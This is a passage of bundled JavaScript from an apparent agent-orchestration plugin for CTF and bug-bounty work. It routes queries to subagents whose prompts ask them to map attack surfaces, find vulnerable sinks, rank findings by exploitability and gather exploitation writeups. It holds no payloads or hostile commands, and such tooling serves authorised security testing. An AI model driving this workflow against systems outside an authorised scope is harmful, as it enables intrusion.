    lines.push("");
    lines.push(section.content.trim() || "No content provided.");
    if (section.artifacts && section.artifacts.length > 0) {
      lines.push("");
      lines.push("Artifacts:");
      for (const artifact of section.artifacts) {
        lines.push(`- \`${artifact}\``);
      }
    }
    lines.push("");
  }
  return lines.join(`
`).trimEnd() + `
`;
}

// src/orchestration/subagent-dispatch.ts
var MAX_TRACKS_HARD_CAP = 6;
var DEFAULT_EXPLORE_TRACKS = 3;
var DEFAULT_LIBRARIAN_TRACKS = 3;
var LIBRARIAN_HINTS = [
  "cve",
  "cwe",
  "nvd",
  "mitre",
  "advisory",
  "writeup",
  "documentation",
  "docs",
  "api",
  "reference",
  "github",
  "repo",
  "framework",
  "library",
  "exploit-db"
];
var EXPLORE_HINTS = [
  "file",
  "files",
  "source",
  "code",
  "codebase",
  "binary",
  "elf",
  "pcap",
  "trace",
  "function",
  "handler",
  "controller",
  "endpoint",
  "grep",
  "glob",
  "ast",
  "line",
  "sink",
  "challenge",
  "artifact"
];
function clampMaxTracks(value, fallback) {
  if (typeof value !== "number" || Number.isNaN(value) || value <= 0) {
    return fallback;
  }
  return Math.min(Math.floor(value), MAX_TRACKS_HARD_CAP);
}
function cleanList(values) {
  if (!values || values.length === 0) {
    return [];
  }
  const dedup = new Set;
  for (const raw of values) {
    const value = raw.trim();
    if (!value) {
      continue;
    }
    dedup.add(value);
  }
  return [...dedup];
}
function compactQuery(query, fallback) {
  const trimmed = query.trim();
  return trimmed ? trimmed : fallback;
}
function safeLabel(input) {
  const normalized = input.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "");
  return normalized || "query";
}
function countHints(haystack, needles) {
  let score = 0;
  for (const hint of needles) {
    if (haystack.includes(hint)) {
      score += 1;
    }
  }
  return score;
}
function detectSearchTypes(query) {
  const q = query.toLowerCase();
  const selected = new Set;
  if (q.includes("cve") || q.includes("cwe") || q.includes("advisory") || q.includes("nvd")) {
    selected.add("cve");
  }
  if (q.includes("writeup") || q.includes("ctf") || q.includes("walkthrough")) {
    selected.add("writeup");
  }
  if (q.includes("docs") || q.includes("documentation") || q.includes("api") || q.includes("framework")) {
    selected.add("docs");
  }
  if (q.includes("github") || q.includes("repo") || q.includes("source")) {
    selected.add("github");
  }
  if (selected.size === 0) {
    return ["cve", "writeup", "docs"];
  }
  return [...selected];
}
function buildExploreTracks(state, query, focusAreas) {
  const modeHint = state.mode === "CTF" ? "CTF mode: challenge-centric artifact and binary/code attack-surface discovery." : "BOUNTY mode: codebase-centric vulnerability pattern review with minimal-impact assumptions.";
  const focusHint = focusAreas.length > 0 ? `Prioritize these focus areas: ${focusAreas.join(", ")}.` : "Prioritize likely hot spots: inputs, trust boundaries, auth/session, parsing, deserialization, command/file/network sinks.";
  return [
    {
      purpose: "aegis-explore-surface-map",
      agent: "aegis-explore",
      prompt: [
        "[Aegis Subagent Dispatch: Explore / Surface Map]",
        `Query: ${query}`,
        modeHint,
        focusHint,
        "Use grep/glob/read/ast_grep_search to map attack surface quickly.",
        "Output <=20 bullet lines with file:line references."
      ].join(`
`)
    },
    {
      purpose: "aegis-explore-vuln-patterns",
      agent: "aegis-explore",
      prompt: [
        "[Aegis Subagent Dispatch: Explore / Vulnerability Patterns]",
        `Query: ${query}`,
        "Search for security-relevant patterns: weak validation, trust-boundary gaps, dangerous sinks, parser misuse, crypto misuse, authz/authn mistakes.",
        "Use targeted grep and AST pattern search only.",
        "Output <=20 bullet lines with file:line references."
      ].join(`
`)
    },
    {
      purpose: "aegis-explore-evidence-cut",
      agent: "aegis-explore",
      prompt: [
        "[Aegis Subagent Dispatch: Explore / Evidence Cut]",
        `Query: ${query}`,
        "Collect the highest-signal findings only and reduce noise.",
        "Rank findings by exploitability and confidence.",
        "Output <=20 bullet lines with file:line references."
      ].join(`
`)
    }
  ];
}
function buildLibrarianPrompt(type, query) {
  if (type === "cve") {
    return [
      "[Aegis Subagent Dispatch: Librarian / CVE Intelligence]",
      `Query: ${query}`,
      "Find CVEs/advisories relevant to this query.",
      "Prefer NVD, vendor advisories, and high-quality writeups.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ].join(`
`);
  }
  if (type === "writeup") {
    return [
      "[Aegis Subagent Dispatch: Librarian / Similar Writeups]",
      `Query: ${query}`,
      "Find similar CTF or real-world incident writeups with actionable exploitation notes.",
      "Prioritize high-signal methodology and reproducible steps.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ].join(`
`);
  }
  if (type === "docs") {
    return [
      "[Aegis Subagent Dispatch: Librarian / Official Documentation]",
      `Query: ${query}`,
      "Find official docs and security guidance for frameworks, APIs, libraries, and configurations involved.",
      "Prefer primary documentation and version-specific guidance.",
      "Return 3-5 references with URL and 1-2 line applicability summary."
    ].join(`
`);
  }
  return [
    "[Aegis Subagent Dispatch: Librarian / GitHub Examples]",
    `Query: ${query}`,
    "Find relevant OSS code examples and security discussions in GitHub repositories/issues.",
    "Prioritize patterns that map to likely exploitation or validation techniques.",
    "Return 3-5 references with URL and 1-2 line applicability summary."
  ].join(`
`);
}
function buildLibrarianTracks(searchTypes, query) {
  return searchTypes.map((searchType) => ({
    purpose: `aegis-librarian-${searchType}`,
    agent: "aegis-librarian",
    prompt: buildLibrarianPrompt(searchType, query)
  }));
}
function planExploreDispatch(state, query, options) {
  const normalizedQuery = compactQuery(query, "targeted attack-surface exploration");
  const focusAreas = cleanList(options?.focusAreas);
  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_EXPLORE_TRACKS);
  const tracks = buildExploreTracks(state, normalizedQuery, focusAreas).slice(0, maxTracks);
  return {
    label: `aegis-explore-${safeLabel(normalizedQuery)}`,
    tracks
  };
}
function planLibrarianDispatch(state, query, options) {
  const normalizedQuery = compactQuery(query, "security reference lookup");
  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_LIBRARIAN_TRACKS);
  const requestedTypes = cleanList(options?.searchTypes);
  const searchTypes = requestedTypes.length > 0 ? requestedTypes : detectSearchTypes(`${state.mode} ${normalizedQuery}`);
  const tracks = buildLibrarianTracks(searchTypes, normalizedQuery).slice(0, maxTracks);
  return {
    label: `aegis-librarian-${safeLabel(normalizedQuery)}`,
    tracks
  };
}
function detectSubagentType(query) {
  const normalized = query.toLowerCase();
  if (normalized.includes("cve") || normalized.includes("docs") || normalized.includes("api")) {
    return "librarian";
  }
  if (normalized.includes("file") || normalized.includes("code") || normalized.includes("binary")) {
    return "explore";
  }
  const librarianScore = countHints(normalized, LIBRARIAN_HINTS);
  const exploreScore = countHints(normalized, EXPLORE_HINTS);
  if (librarianScore > exploreScore) {
    return "librarian";
  }
  return "explore";
}

// src/tools/control-tools.ts
import { randomUUID } from "crypto";
import { appendFileSync as appendFileSync2, existsSync as existsSync7, mkdirSync as mkdirSync4, readFileSync as readFileSync7, readdirSync, renameSync as renameSync4, statSync as statSync2, writeFileSync as writeFileSync4 } from "fs";
import { isAbsolute as isAbsolute3, join as join8, relative as relative2, resolve as resolve3 } from "path";
var schema3 = tool.schema;
var FAILURE_REASON_VALUES = [
  "verification_mismatch",
  "tooling_timeout",
  "context_overflow",
  "hypothesis_stall",
  "unsat_claim",
  "static_dynamic_contradiction",
  "exploit_chain",
  "environment"
];
function createControlTools(store, notesStore, config3, projectDir, client, parallelBackgroundManager) {
  const isRecord4 = (value) => Boolean(value) && typeof value === "object" && !Array.isArray(value);
  const hasError3 = (result) => {
    if (!isRecord4(result))
      return false;
    return Boolean(result.error);
  };
  const safeJsonParse = (raw) => {
    try {
      return JSON.parse(raw);
    } catch {
      return null;
    }
  };
  const validateEventPhaseTransition = (event, phase) => {
    if (event === "scan_completed" && phase !== "SCAN") {
      return `Event '${event}' is only valid in SCAN phase (current=${phase}).`;
    }
    if (event === "plan_completed" && phase !== "PLAN") {
      return `Event '${event}' is only valid in PLAN phase (current=${phase}).`;
    }
    if ((event === "verify_success" || event === "verify_fail") && phase !== "EXECUTE") {
      return `Event '${event}' is only valid in EXECUTE phase (current=${phase}).`;
    }
    return null;
  };
  const extractAgentModels = (opencodePath) => {
    if (!opencodePath)
      return [];
    let parsed;
    try {
      parsed = safeJsonParse(readFileSync7(opencodePath, "utf-8"));
    } catch {
      return [];
    }
    if (!isRecord4(parsed))
      return [];
    const agentCandidate = isRecord4(parsed.agent) ? parsed.agent : isRecord4(parsed.agents) ? parsed.agents : null;
    if (!agentCandidate)
      return [];
    const models = [];
    for (const value of Object.values(agentCandidate)) {
      if (!isRecord4(value))
        continue;
      const m = value.model;
      if (typeof m === "string" && m.trim().length > 0) {
        models.push(m.trim());
      }
    }
    return [...new Set(models)];
  };
  const getClaudeCompatibilityReport = () => {
    const settingsDir = join8(projectDir, ".claude");
    const settingsFiles = [
      join8(settingsDir, "settings.json"),
      join8(settingsDir, "settings.local.json")
    ].filter((p) => existsSync7(p));
    const rulesDir = join8(settingsDir, "rules");
    let ruleMdFiles = 0;
    try {
      if (existsSync7(rulesDir)) {
        const stack = [rulesDir];
        while (stack.length > 0 && ruleMdFiles < 200) {
          const dir = stack.pop();
          const entries = readdirSync(dir, { withFileTypes: true });
          for (const e of entries) {
            const p = join8(dir, e.name);
            if (e.isDirectory()) {
              stack.push(p);
              continue;
            }
            if (e.isFile() && e.name.toLowerCase().endsWith(".md")) {
              ruleMdFiles += 1;
            }
          }
        }
      }
    } catch {
      ruleMdFiles = 0;
    }
    const mcpPath = join8(projectDir, ".mcp.json");
    const servers = [];
    if (existsSync7(mcpPath)) {
      try {
        const raw = readFileSync7(mcpPath, "utf-8");
        const parsed = safeJsonParse(raw);
        const candidate = isRecord4(parsed) && isRecord4(parsed.mcpServers) ? parsed.mcpServers : isRecord4(parsed) ? parsed : null;
        if (candidate) {
          for (const [name, value] of Object.entries(candidate)) {
            if (!isRecord4(value)) {
              continue;
            }
            const type = typeof value.type === "string" ? value.type : undefined;
            servers.push({ name, type });
          }
        }
      } catch {
        servers.length = 0;
      }
    }
    return {
      settings: { files: settingsFiles.map((p) => p) },
      rules: { dir: rulesDir, mdFiles: ruleMdFiles },
      mcp_json: { path: mcpPath, found: existsSync7(mcpPath), servers }
    };
  };
  const providerIdFromModel4 = (model) => {
    const trimmed = model.trim();
    const idx = trimmed.indexOf("/");
    if (idx === -1)
      return trimmed;
    return trimmed.slice(0, idx);
  };
  const normalizeSubagentType = (raw) => {
    const normalized = baseAgentName(raw.trim());
    return normalized.trim();
  };
  const isValidModelID = (raw) => /^[^/\s]+\/[^/\s]+$/.test(raw.trim());
  const isValidVariantID = (raw) => /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(raw.trim());
  const modelIdFromModel = (model) => {
    const trimmed = model.trim();
    const idx = trimmed.indexOf("/");
    if (idx === -1)
      return "";
    return trimmed.slice(idx + 1);
  };
  const isInteractiveEnabledForSession = (sessionID) => {
    if (config3.interactive.enabled)
      return true;
    const state = store.get(sessionID);
    if (state.mode !== "CTF")
      return false;
    return config3.interactive.enabled_in_ctf !== false;
  };
  const extractSessionApi = () => {
    const session = client?.session;
    if (!session || typeof session !== "object")
      return null;
    return session;
  };
  const callPrimaryThenFallback = async (params) => {
    try {
      const primary = await params.fn(params.primaryArgs);
      const data = params.extractData(primary);
      if (data !== null) {
        return { ok: true, data };
      }
    } catch (error92) {}
    try {
      const fallback = await params.fn(params.fallbackArgs);
      const data = params.extractData(fallback);
      if (data !== null) {
        return { ok: true, data };
      }
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
    return { ok: false, reason: params.unexpectedReason };
  };
  const callSessionList = async (directory, limit) => {
    const sessionApi = extractSessionApi();
    const listFn = sessionApi?.list;
    if (typeof listFn === "function") {
      const listed = await callPrimaryThenFallback({
        fn: listFn,
        primaryArgs: { query: { directory, limit } },
        fallbackArgs: { directory, limit },
        extractData: (result) => {
          const candidate = isRecord4(result) ? result.data : null;
          return Array.isArray(candidate) ? candidate : null;
        },
        unexpectedReason: "unexpected session.list response"
      });
      if (listed.ok) {
        return { ok: true, data: listed.data };
      }
    }
    const sessionClient = extractSessionClient(client);
    if (!sessionClient) {
      return { ok: false, reason: "SDK session client not available" };
    }
    try {
      const statusMap = await sessionClient.status({ query: { directory } });
      const map3 = isRecord4(statusMap?.data) ? statusMap.data : isRecord4(statusMap) ? statusMap : {};
      const ids = Object.keys(map3);
      const sliced = typeof limit === "number" && limit > 0 ? ids.slice(0, limit) : ids;
      const synthesized = sliced.map((id) => {
        const item = map3[id];
        const status = isRecord4(item) && typeof item.type === "string" ? item.type : undefined;
        return { id, status };
      });
      return { ok: true, data: synthesized };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callSessionMessages = async (directory, sessionID, limit) => {
    const sessionClient = extractSessionClient(client);
    if (!sessionClient) {
      return { ok: false, reason: "SDK session client not available" };
    }
    const res = await callPrimaryThenFallback({
      fn: sessionClient.messages,
      primaryArgs: { path: { id: sessionID }, query: { directory, limit } },
      fallbackArgs: { sessionID, directory, limit },
      extractData: (result) => {
        if (hasError3(result) || !isRecord4(result))
          return null;
        const data = result.data;
        return Array.isArray(data) ? data : null;
      },
      unexpectedReason: "unexpected session.messages response"
    });
    return res.ok ? { ok: true, data: res.data } : { ok: false, reason: res.reason };
  };
  const ensureInsideProject = (candidatePath) => {
    const abs = isAbsolute3(candidatePath) ? resolve3(candidatePath) : resolve3(projectDir, candidatePath);
    const rel = relative2(projectDir, abs);
    if (!rel || !rel.startsWith("..") && !isAbsolute3(rel)) {
      return { ok: true, abs };
    }
    return { ok: false, reason: "path escapes project directory" };
  };
  const buildEmptyGraph = () => {
    const now = new Date().toISOString();
    return {
      format: "aegis-knowledge-graph",
      version: 1,
      revision: 0,
      createdAt: now,
      updatedAt: now,
      entities: [],
      relations: []
    };
  };
  const graphPaths = () => {
    const resolved = ensureInsideProject(config3.memory.storage_dir);
    if (!resolved.ok) {
      return { ok: false, reason: `memory.storage_dir ${resolved.reason}` };
    }
    return { ok: true, dir: resolved.abs, file: join8(resolved.abs, "knowledge-graph.json") };
  };
  const readGraph = () => {
    const paths = graphPaths();
    if (!paths.ok)
      return paths;
    try {
      if (!existsSync7(paths.file)) {
        return { ok: true, graph: buildEmptyGraph() };
      }
      const raw = readFileSync7(paths.file, "utf-8");
      const parsed = JSON.parse(raw);
      if (!isRecord4(parsed) || parsed.format !== "aegis-knowledge-graph") {
        return { ok: false, reason: "invalid knowledge-graph format" };
      }
      const entities = Array.isArray(parsed.entities) ? parsed.entities : [];
      const relations = Array.isArray(parsed.relations) ? parsed.relations : [];
      const graph = {
        format: "aegis-knowledge-graph",
        version: 1,
        revision: typeof parsed.revision === "number" ? parsed.revision : 0,
        createdAt: typeof parsed.createdAt === "string" ? parsed.createdAt : new Date().toISOString(),
        updatedAt: typeof parsed.updatedAt === "string" ? parsed.updatedAt : new Date().toISOString(),
        entities,
        relations
      };
      return { ok: true, graph };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const writeGraph = (graph) => {
    const paths = graphPaths();
    if (!paths.ok)
      return paths;
    try {
      mkdirSync4(paths.dir, { recursive: true });
      const now = new Date().toISOString();
      graph.updatedAt = now;
      graph.revision = (graph.revision ?? 0) + 1;
      const tmp = `${paths.file}.tmp`;
      writeFileSync4(tmp, `${JSON.stringify(graph, null, 2)}
`, "utf-8");
      renameSync4(tmp, paths.file);
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const thinkStateBySession = new Map;
  const ensureThinkState = (sessionID) => {
    const existing = thinkStateBySession.get(sessionID);
    if (existing)
      return existing;
    const created = { thoughtHistoryLength: 0, branches: new Set, totalThoughts: 1 };
    thinkStateBySession.set(sessionID, created);
    return created;
  };
  const appendThinkRecord = (sessionID, payload) => {
    try {
      const root = notesStore.getRootDirectory();
      const dir = join8(root, "thinking");
      const safeSessionID = normalizeSessionID(sessionID);
      mkdirSync4(dir, { recursive: true });
      const file3 = join8(dir, `${safeSessionID}.jsonl`);
      const line = `${JSON.stringify({ at: new Date().toISOString(), ...payload })}
`;
      appendFileSync2(file3, line, "utf-8");
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const metricsPath = () => join8(notesStore.getRootDirectory(), "metrics.json");
  const appendMetric = (entry) => {
    try {
      const path = metricsPath();
      let list = [];
      if (existsSync7(path)) {
        try {
          list = JSON.parse(readFileSync7(path, "utf-8"));
        } catch {
          list = [];
        }
      }
      const arr = Array.isArray(list) ? list : [];
      arr.push(entry);
      writeFileSync4(path, `${JSON.stringify(arr, null, 2)}
`, "utf-8");
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callConfigProviders = async (directory) => {
    const configApi = client?.config;
    const providersFn = configApi?.providers;
    if (typeof providersFn !== "function") {
      return { ok: false, reason: "client.config.providers unavailable" };
    }
    try {
      const result = await providersFn({ query: { directory } });
      const data = result?.data;
      if (!data || !Array.isArray(data.providers)) {
        return { ok: false, reason: "unexpected /config/providers response" };
      }
      return { ok: true, data };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPromptAsync = async (sessionID, text, metadata) => {
    const sessionApi = client?.session;
    const promptAsync = sessionApi?.promptAsync;
    if (typeof promptAsync !== "function") {
      return { ok: false, reason: "client.session.promptAsync unavailable" };
    }
    try {
      await promptAsync({
        path: { id: sessionID },
        body: {
          parts: [
            {
              type: "text",
              text,
              synthetic: true,
              metadata
            }
          ]
        }
      });
      return { ok: true };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const listClaudeSkillsAndCommands = () => {
    const base = join8(projectDir, ".claude");
    const skillsDir = join8(base, "skills");
    const commandsDir = join8(base, "commands");
    const skills = [];
    const commands = [];
    try {
      if (existsSync7(skillsDir)) {
        const entries = readdirSync(skillsDir, { withFileTypes: true });
        for (const e of entries) {
          if (!e.isDirectory())
            continue;
          const name = e.name;
          if (!name || name.startsWith("."))
            continue;
          const skillPath = join8(skillsDir, name, "SKILL.md");
          if (existsSync7(skillPath)) {
            skills.push(name);
          }
        }
      }
    } catch {
      skills.length = 0;
    }
    try {
      if (existsSync7(commandsDir)) {
        const entries = readdirSync(commandsDir, { withFileTypes: true });
        for (const e of entries) {
          if (!e.isFile())
            continue;
          const name = e.name;
          if (!name.toLowerCase().endsWith(".md"))
            continue;
          const baseName = name.slice(0, -3);
          if (!baseName || baseName.startsWith("."))
            continue;
          commands.push(baseName);
        }
      }
    } catch {
      commands.length = 0;
    }
    skills.sort();
    commands.sort();
    return { skills, commands };
  };
  const renderSkillTemplate = (template, args) => {
    let out = template;
    out = out.replace(/\$ARGUMENTS\[(\d+)\]/g, (_m, nRaw) => {
      const n = Number(nRaw);
      if (!Number.isFinite(n) || n < 0)
        return "";
      return args[n] ?? "";
    });
    out = out.replace(/\$ARGUMENTS\b/g, args.join(" "));
    return out;
  };
  const loadClaudeSkillOrCommand = (name) => {
    const trimmed = name.trim();
    if (!trimmed) {
      return { ok: false, reason: "name is required" };
    }
    const base = join8(projectDir, ".claude");
    const skillPath = join8(base, "skills", trimmed, "SKILL.md");
    const commandPath = join8(base, "commands", `${trimmed}.md`);
    const candidates2 = [];
    if (existsSync7(skillPath))
      candidates2.push({ kind: "skill", path: skillPath });
    if (existsSync7(commandPath))
      candidates2.push({ kind: "command", path: commandPath });
    if (candidates2.length === 0) {
      return { ok: false, reason: "not found" };
    }
    const chosen = candidates2[0];
    try {
      const st = statSync2(chosen.path);
      if (!st.isFile()) {
        return { ok: false, reason: "not a file" };
      }
      if (st.size > 128 * 1024) {
        return { ok: false, reason: "file too large" };
      }
      const text = readFileSync7(chosen.path, "utf-8");
      return { ok: true, kind: chosen.kind, path: chosen.path, text };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyCreate = async (directory, body) => {
    const ptyApi = client?.pty;
    const createFn = ptyApi?.create;
    if (typeof createFn !== "function") {
      return { ok: false, reason: "client.pty.create unavailable" };
    }
    try {
      const primary = await createFn({ query: { directory }, body });
      const data = primary?.data;
      if (data) {
        return { ok: true, data };
      }
      const fallback = await createFn({ directory, ...body });
      const fallbackData = fallback?.data;
      if (!fallbackData) {
        return { ok: false, reason: "pty.create returned no data" };
      }
      return { ok: true, data: fallbackData };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyList = async (directory) => {
    const ptyApi = client?.pty;
    const listFn = ptyApi?.list;
    if (typeof listFn !== "function") {
      return { ok: false, reason: "client.pty.list unavailable" };
    }
    try {
      const primary = await listFn({ query: { directory } });
      const data = primary?.data;
      if (Array.isArray(data)) {
        return { ok: true, data };
      }
      const fallback = await listFn({ directory });
      const fallbackData = fallback?.data;
      if (!Array.isArray(fallbackData)) {
        return { ok: false, reason: "pty.list returned unexpected data" };
      }
      return { ok: true, data: fallbackData };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyRemove = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const removeFn = ptyApi?.remove;
    if (typeof removeFn !== "function") {
      return { ok: false, reason: "client.pty.remove unavailable" };
    }
    try {
      const primary = await removeFn({ query: { directory, ptyID } });
      if (primary?.data !== undefined) {
        return { ok: true, data: primary.data };
      }
      const fallback = await removeFn({ ptyID, directory });
      return { ok: true, data: fallback?.data };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyGet = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const getFn = ptyApi?.get;
    if (typeof getFn !== "function") {
      return { ok: false, reason: "client.pty.get unavailable" };
    }
    try {
      const primary = await getFn({ query: { directory, ptyID } });
      const data = primary?.data;
      if (data) {
        return { ok: true, data };
      }
      const fallback = await getFn({ ptyID, directory });
      const fallbackData = fallback?.data;
      if (!fallbackData) {
        return { ok: false, reason: "pty.get returned no data" };
      }
      return { ok: true, data: fallbackData };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyUpdate = async (directory, ptyID, body) => {
    const ptyApi = client?.pty;
    const updateFn = ptyApi?.update;
    if (typeof updateFn !== "function") {
      return { ok: false, reason: "client.pty.update unavailable" };
    }
    try {
      const primary = await updateFn({ query: { directory, ptyID }, body });
      if (primary?.data !== undefined) {
        return { ok: true, data: primary.data };
      }
      const fallback = await updateFn({ ptyID, directory, ...body });
      return { ok: true, data: fallback?.data };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callPtyConnect = async (directory, ptyID) => {
    const ptyApi = client?.pty;
    const connectFn = ptyApi?.connect;
    if (typeof connectFn !== "function") {
      return { ok: false, reason: "client.pty.connect unavailable" };
    }
    try {
      const primary = await connectFn({ query: { directory, ptyID } });
      const data = primary?.data;
      if (data) {
        return { ok: true, data };
      }
      const fallback = await connectFn({ ptyID, directory });
      const fallbackData = fallback?.data;
      if (!fallbackData) {
        return { ok: false, reason: "pty.connect returned no data" };
      }
      return { ok: true, data: fallbackData };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const astTools = createAstGrepTools({
    projectDir,
    getMode: (sessionID) => store.get(sessionID).mode
  });
  const lspTools = createLspTools({ client, projectDir });
  return {
    ...astTools,
    ...lspTools,
    ctf_orch_status: tool({
      description: "Get current CTF/BOUNTY orchestration state and route decision",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const decision = route(state, config3);
        return JSON.stringify({ sessionID, state, mode_explicit: state.modeExplicit, decision }, null, 2);
      }
    }),
    ctf_orch_set_mode: tool({
      description: "Set orchestrator mode (CTF or BOUNTY) for this session",
      args: {
        mode: schema3.enum(["CTF", "BOUNTY"]),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.setMode(sessionID, args.mode);
        return JSON.stringify({ sessionID, mode: state.mode, mode_explicit: state.modeExplicit }, null, 2);
      }
    }),
    ctf_orch_set_subagent_profile: tool({
      description: "Set model/variant override for a subagent in this session",
      args: {
        subagent_type: schema3.string().min(1),
        model: schema3.string().min(3),
        variant: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const subagentType = normalizeSubagentType(args.subagent_type);
        const model = args.model.trim();
        const variant = typeof args.variant === "string" ? args.variant.trim() : "";
        if (!subagentType) {
          return JSON.stringify({ ok: false, reason: "invalid subagent_type", sessionID }, null, 2);
        }
        if (!isValidModelID(model)) {
          return JSON.stringify({
            ok: false,
            reason: "model must be in provider/model format",
            sessionID,
            subagent_type: subagentType
          }, null, 2);
        }
        if (variant.length > 0 && !isValidVariantID(variant)) {
          return JSON.stringify({
            ok: false,
            reason: "variant contains invalid characters",
            sessionID,
            subagent_type: subagentType
          }, null, 2);
        }
        const supported = supportedVariantsForModel(model);
        if (supported.length > 0 && variant.length === 0) {
          return JSON.stringify({
            ok: false,
            reason: "variant is required for model",
            sessionID,
            subagent_type: subagentType,
            model,
            supported_variants: supported
          }, null, 2);
        }
        if (!isVariantSupportedForModel(model, variant)) {
          return JSON.stringify({
            ok: false,
            reason: "variant not supported for model",
            sessionID,
            subagent_type: subagentType,
            model,
            variant,
            supported_variants: supported
          }, null, 2);
        }
        const state = store.setSubagentProfileOverride(sessionID, subagentType, {
          model,
          variant
        });
        return JSON.stringify({
          ok: true,
          sessionID,
          subagent_type: subagentType,
          profile: state.subagentProfileOverrides[subagentType] ?? null,
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_clear_subagent_profile: tool({
      description: "Clear one (or all) session subagent model/variant overrides",
      args: {
        subagent_type: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const hasSubagent = typeof args.subagent_type === "string" && args.subagent_type.trim().length > 0;
        const subagentType = hasSubagent ? normalizeSubagentType(args.subagent_type) : undefined;
        const state = store.clearSubagentProfileOverride(sessionID, subagentType);
        return JSON.stringify({
          ok: true,
          sessionID,
          cleared: subagentType ?? "all",
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_list_subagent_profiles: tool({
      description: "List current session subagent model/variant overrides",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        return JSON.stringify({
          ok: true,
          sessionID,
          overrides: state.subagentProfileOverrides
        }, null, 2);
      }
    }),
    ctf_orch_set_ultrawork: tool({
      description: "Enable or disable ultrawork mode (continuous execution posture) for this session",
      args: {
        enabled: schema3.boolean(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        store.setUltraworkEnabled(sessionID, args.enabled);
        const state = store.setAutoLoopEnabled(sessionID, args.enabled);
        return JSON.stringify({
          sessionID,
          ultraworkEnabled: state.ultraworkEnabled,
          autoLoopEnabled: state.autoLoopEnabled
        }, null, 2);
      }
    }),
    ctf_orch_set_autoloop: tool({
      description: "Enable or disable automatic loop continuation for this session",
      args: {
        enabled: schema3.boolean(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.setAutoLoopEnabled(sessionID, args.enabled);
        return JSON.stringify({
          sessionID,
          autoLoopEnabled: state.autoLoopEnabled,
          autoLoopIterations: state.autoLoopIterations
        }, null, 2);
      }
    }),
    ctf_orch_event: tool({
      description: "Apply an orchestration state event (scan/plan/verify/stuck tracking)",
      args: {
        event: schema3.enum([
          "scan_completed",
          "plan_completed",
          "candidate_found",
          "verify_success",
          "verify_fail",
          "no_new_evidence",
          "same_payload_repeat",
          "new_evidence",
          "readonly_inconclusive",
          "scope_confirmed",
          "context_length_exceeded",
          "timeout",
          "unsat_claim",
          "static_dynamic_contradiction",
          "reset_loop"
        ]),
        session_id: schema3.string().optional(),
        candidate: schema3.string().optional(),
        verified: schema3.string().optional(),
        hypothesis: schema3.string().optional(),
        alternatives: schema3.array(schema3.string()).optional(),
        failure_reason: schema3.enum([
          "verification_mismatch",
          "tooling_timeout",
          "context_overflow",
          "hypothesis_stall",
          "unsat_claim",
          "static_dynamic_contradiction",
          "exploit_chain",
          "environment"
        ]).optional(),
        failed_route: schema3.string().optional(),
        failure_summary: schema3.string().optional(),
        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const currentState = store.get(sessionID);
        const phaseTransitionError = validateEventPhaseTransition(args.event, currentState.phase);
        if (phaseTransitionError) {
          return JSON.stringify({
            ok: false,
            sessionID,
            event: args.event,
            phase: currentState.phase,
            reason: phaseTransitionError
          }, null, 2);
        }
        if (args.event === "verify_success" && (!args.verified || args.verified.trim().length === 0)) {
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "verify_success requires non-empty verified evidence in args.verified"
          }, null, 2);
        }
